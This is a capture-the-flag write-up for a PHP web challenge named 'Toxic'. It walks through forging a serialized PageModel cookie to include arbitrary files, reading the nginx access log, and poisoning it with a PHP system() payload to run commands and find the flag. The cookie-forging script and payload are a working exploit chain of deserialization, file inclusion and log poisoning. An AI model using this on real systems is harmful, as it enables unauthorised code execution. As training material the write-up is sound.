# Toxic (web)

### author: k0d14k

<p>Toxic is a web page written in PHP that shows information about frogs.</p>

<p>The file to be rendered is set in the <strong>PHPSESSID</strong> Cookie which is the base64 of a <strong>PageModel</strong> serialization.</p>

<p><img src="data:image/png;base64," /></p>

<p>The flag is used just at the <strong>entrypoint.sh</strong> file as follows:</p>

<p><img src="data:image/png;base64," /></p>

<p>We need to exploit the <strong>PHPSESSID </strong>Cookie to force the server to read the flag file instead of <strong>index.html</strong></p>

<p>To access another file tampering the cookie we can use this following script:</p>

<div>
<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px">&lt;?php</div>

<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px">class PageModel{</div>

<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px">&nbsp;&nbsp;&nbsp; public $file;</div>

<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px">&nbsp;&nbsp;&nbsp; public function __destruct(){</div>

<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; include($this-&gt;file);</div>

<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px">&nbsp;&nbsp;&nbsp; }</div>

<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px">}</div>

<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px">$page = new PageModel;</div>

<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px">$page-&gt;file = &#39;[file name]&#39;;</div>

<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px">echo &quot;\n\nCOOKIE: &quot;.base64_encode(serialize($page)).&quot;\n\n&quot;;</div>
</div>

<p>The first trouble is that we don&#39;t know the file&#39;s name.</p>

<p>We can ask ourselves, What do we know right now about the application? Well, we know that is a PHP application that&#39;s running on a nginx server.</p>

<p>OK! We know how to get an <strong>RCE</strong> if we can access the file <strong>/var/log/nginx/access.log</strong> so let&#39;s check if we can access this file.</p>

<p><img src="data:image/png;base64," style="height:551px; width:1088px" /></p>

<p>&nbsp;</p>

<p>Very well, now we can try to inject our payload:</p>

<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px">&lt;?php system(&#39;ls /&#39;);?&gt;</div>

<p><img src="data:image/png;base64," style="height:433px; width:1087px" /></p>

<p>And finally, we have the file name: <strong>flag_yFs8d </strong>and now we can simply access the flag.</p>

<p><img src="data:image/png;base64," style="height:213px; width:1087px" /></p>
